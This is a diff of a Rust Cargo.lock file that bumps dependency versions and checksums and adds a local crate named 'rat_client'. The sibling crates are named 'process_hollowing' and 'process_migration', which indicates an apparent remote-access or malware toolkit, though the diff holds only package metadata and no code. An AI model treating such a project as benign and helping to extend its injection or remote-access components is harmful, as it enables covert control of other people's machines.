@@ -4,9 +4,9 @@ version = 3
 
 [[package]]
 name = "autocfg"
-version = "1.0.1"
+version = "1.1.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "cdb031dd78e28731d87d56cc8ffef4a8f36ca26c38fe2de700543e627f8a464a"
+checksum = "d468802bab17cbc0cc575e9b053f41e72aa36bfa6b7f55e3529ffa43161b97fa"
 
 [[package]]
 name = "bitflags"
@@ -28,9 +28,9 @@ checksum = "baf1de4339761588bc0619e3cbc0120ee582ebb74b53b4efbf79117bd2da40fd"
 
 [[package]]
 name = "libc"
-version = "0.2.117"
+version = "0.2.118"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "e74d72e0f9b65b5b4ca49a346af3976df0f9c61d550727f349ecd559f251a26c"
+checksum = "06e509672465a0504304aa87f9f176f2b2b716ed8fb105ebe5c02dc6dce96a94"
 
 [[package]]
 name = "memoffset"
@@ -56,7 +56,7 @@ dependencies = [
 
 [[package]]
 name = "process_hollowing"
-version = "1.4.1"
+version = "1.4.2"
 dependencies = [
  "nix",
  "rco_config",
@@ -66,13 +66,17 @@ dependencies = [
 
 [[package]]
 name = "process_migration"
-version = "1.6.1"
+version = "1.6.2"
 dependencies = [
  "nix",
  "rco_config",
  "rco_utils",
  "windows",
 ]
+
+[[package]]
+name = "rat_client"
+version = "0.1.0"
 
 [[package]]
 name = "rco_config"
